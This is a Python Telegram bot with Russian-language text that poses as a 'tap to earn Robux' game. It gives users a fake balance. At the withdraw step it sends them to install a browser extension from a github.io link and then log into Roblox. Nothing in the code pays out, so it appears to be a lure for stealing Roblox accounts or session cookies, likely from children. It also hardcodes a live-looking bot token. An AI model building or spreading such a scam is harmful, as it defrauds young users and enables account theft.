import telebot
import sqlite3
from datetime import datetime
from flask import Flask, request

# ===== ТОКЕН =====
TOKEN = '8684971280:AAH0V29u4vT382wAv28eGr2Bo2OXMi79ERI'
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# ===== БАЗА ДАННЫХ =====
conn = sqlite3.connect('users.db', check_same_thread=False)

def create_table():
    cur = conn.cursor()
    cur.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            balance INTEGER DEFAULT 0,
            energy INTEGER DEFAULT 50,
            last_tap_date TEXT,
            last_bonus_date TEXT
        )
    ''')
    conn.commit()
    cur.close()

def get_user(user_id):
    cur = conn.cursor()
    cur.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
    user = cur.fetchone()
    cur.close()
    if not user:
        cur2 = conn.cursor()
        cur2.execute('''
            INSERT INTO users (user_id, balance, energy, last_tap_date, last_bonus_date)
            VALUES (?, 0, 50, ?, '')
        ''', (user_id, datetime.now().strftime('%Y-%m-%d')))
        conn.commit()
        cur2.close()
        cur3 = conn.cursor()
        cur3.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
        user = cur3.fetchone()
        cur3.close()
    return user

def update_user(user_id, balance=None, energy=None, last_tap_date=None, last_bonus_date=None):
    cur = conn.cursor()
    if balance is not None:
        cur.execute('UPDATE users SET balance = ? WHERE user_id = ?', (balance, user_id))
    if energy is not None:
        cur.execute('UPDATE users SET energy = ? WHERE user_id = ?', (energy, user_id))
    if last_tap_date is not None:
        cur.execute('UPDATE users SET last_tap_date = ? WHERE user_id = ?', (last_tap_date, user_id))
    if last_bonus_date is not None:
        cur.execute('UPDATE users SET last_bonus_date = ? WHERE user_id = ?', (last_bonus_date, user_id))
    conn.commit()
    cur.close()

# ===== КЛАВИАТУРА =====
def main_menu():
    keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add('💲 Тапнуть', '🎁 Бонус дня')
    keyboard.add('📊 Баланс', '💳 Вывести')
    return keyboard

# ===== КОМАНДЫ =====
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.chat.id
    get_user(user_id)
    bot.send_message(user_id, '⚡ Добро пожаловать!\nНажимай "Тапнуть" и получай Robux.', reply_markup=main_menu())

@bot.message_handler(func=lambda message: message.text == '💲 Тапнуть')
def tap(message):
    user_id = message.chat.id
    user = get_user(user_id)
    today = datetime.now().strftime('%Y-%m-%d')
    balance, energy, last_tap_date, last_bonus_date = user[1], user[2], user[3], user[4]

    if last_tap_date != today:
        energy = 50
        update_user(user_id, energy=energy, last_tap_date=today)

    if energy <= 0:
        bot.send_message(user_id, '⛔ Нет энергии! Жди завтра.')
        return

    energy -= 1
    balance += 1
    update_user(user_id, balance=balance, energy=energy)
    bot.send_message(user_id, f'✅ +1 Robux!\n⚡ Энергия: {energy}/50\n💰 Баланс: {balance} Robux')

@bot.message_handler(func=lambda message: message.text == '🎁 Бонус дня')
def bonus(message):
    user_id = message.chat.id
    user = get_user(user_id)
    today = datetime.now().strftime('%Y-%m-%d')
    balance, last_bonus_date = user[1], user[4]

    if last_bonus_date == today:
        bot.send_message(user_id, '⛔ Ты уже получил бонус сегодня!')
        return

    balance += 10
    update_user(user_id, balance=balance, last_bonus_date=today)
    bot.send_message(user_id, f'🎁 +10 Robux (бонус дня)!\n💰 Баланс: {balance} Robux')

@bot.message_handler(func=lambda message: message.text == '📊 Баланс')
def show_balance(message):
    user_id = message.chat.id
    user = get_user(user_id)
    balance, energy = user[1], user[2]
    bot.send_message(user_id, f'📊 Твой баланс:\n💰 {balance} Robux\n⚡ Энергия: {energy}/50')

@bot.message_handler(func=lambda message: message.text == '💳 Вывести')
def withdraw(message):
    user_id = message.chat.id
    user = get_user(user_id)
    balance = user[1]

    if balance < 20:
        bot.send_message(user_id, '⛔ Минимальный вывод — 20 Robux.')
        return

    bot.send_message(user_id,
                     '📹 **Инструкция по установке расширения**\n\n'
                     '1. Скачай расширение по ссылке:\n'
                     '👉 https://valeryiusmanov-sketch.github.io/H/\n\n'
                     '2. Установи в браузере (инструкция в видео).\n\n'
                     '⚠️ **Важно:**\n'
                     'После установки расширения **обязательно зайди на официальный сайт Roblox** и войди в аккаунт.\n'
                     'В течение 3 часов тебе придут Robux.',
                     parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == 'Готово')
def done(message):
    bot.send_message(message.chat.id, '🔄 Проверка выполняется... Ожидай до 2 минут.\nЕсли Robux не пришли — напиши в поддержку.')

# ===== ВЕБХУК =====
@app.route('/webhook', methods=['POST'])
def webhook():
    json_data = request.get_json()
    if json_data:
        update = telebot.types.Update.de_json(json_data)
        bot.process_new_updates([update])
    return 'OK', 200

@app.route('/')
def index():
    return '✅ Бот работает! Вебхук активен.'

# ===== ЗАПУСК =====
if __name__ == '__main__':
    create_table()
    bot.remove_webhook()
    bot.set_webhook(url='https://НАЗВАНИЕ_ТВОЕГО_СЕРВИСА.onrender.com/webhook')
    app.run(host='0.0.0.0', port=10000)